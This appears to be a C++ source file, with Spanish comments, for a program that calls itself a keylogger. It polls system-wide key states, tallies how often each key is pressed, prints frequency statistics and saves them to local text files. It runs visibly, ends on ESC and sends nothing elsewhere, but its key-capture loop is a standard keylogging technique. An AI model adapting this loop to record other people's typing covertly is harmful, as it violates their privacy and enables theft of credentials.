#include "Utility.h"

// Constructor, inicializa R y DB
Utility::Utility() {
    this->R = new Registry();
    this->DB = new Registry();
}

// Destructor
Utility::~Utility() {
}

// Inicia el método que graba las pulsaciones del teclado en R
void Utility::keylogger() {
    unsigned char key;
    bool active = true;

    while (active) {
        cout << "Keylogger activo... [Finalizar con ESC]";

        for (key = 8; key <= 255; key++)
            if (GetAsyncKeyState(key) == -32767)
                if (key == 0x1B) {
                    active = false;
                    break;
                }
                else R->registerKey(key);
        Sleep(350);
    }
}

// Fusiona R con DB
void Utility::addRtoDB() {
    ifstream file("log_DB.txt");
    if (file) {
        importDB();
        
        map<int, int>::iterator it_R = R->getDB().begin();
        for (auto it_R : R->getDB())
            DB->update(it_R.first,it_R.second);
    }
    else {
        DB->setDB(R);
    }
}

// Importa DB
void Utility::importDB() {
    string buff;
    ifstream sfile("log_DB.txt");

    if (sfile.is_open()) {
        while (getline(sfile, buff))
            DB->setDB(buff.front(), (int)buff.back() - 48);
        sfile.close();
    }
}

// Método parcial, imprime los datos de R
void Utility::readR() {
    system("cls");
    cout << reader(R);
    system("pause");
    system("cls");
}

// Método parcial, imprime los datos de DB
void Utility::readDB() {
    importDB();
    system("cls");
    cout << reader(DB);
    system("pause");
    system("cls");
    DB->getDB().clear();
}

// Genera las estadísticas de los datos de un Map indicado como parámetro
string Utility::reader(Registry *M) {
    string output;
    stringstream ss;
    int total = 0;
    double percent;

    for (auto element : M->getDB()) total += element.second;

    output = "CARACTER\tREPETICIONES\tPORCENTAJE\n";
    for (auto element : M->getDB()) {
        if (total == 0) percent = 0;
        else percent = ((double)element.second / total) * 100;
        ss << (char)element.first << "\t\t" << element.second << "\t\t" << setprecision(2) << fixed << percent << " %" << endl;
    }
    output.append(ss.str() + "\n");
    ss.str(string());

    return output;
}

// Método parcial, exporta R
void Utility::exportR() {
    time_t now = time(0);
    tm* ltm = localtime(&now);

    int year = 1900 + ltm->tm_year;
    int month = 1 + ltm->tm_mon;
    int day = ltm->tm_mday;

    string filename = "log_" + to_string(year)
        + "_" + to_string(month)
        + "_" + to_string(day)
        + "_" + to_string(now) + ".txt";

    exportToFile(filename, R);
}

// Método parcial, exporta DB
void Utility::exportDB() {
    string filename = "log_DB.txt";
    exportToFile(filename, DB);
}

// Exporta un Map indicado como parámetro, junto con su nombre
void Utility::exportToFile(string filename, Registry* M) {
    ofstream outputFile;
    outputFile.open(filename, fstream::out);
    for (auto KV : M->getDB())
        outputFile << (char)KV.first << "\t" << KV.second << "\n";
    outputFile.close();
}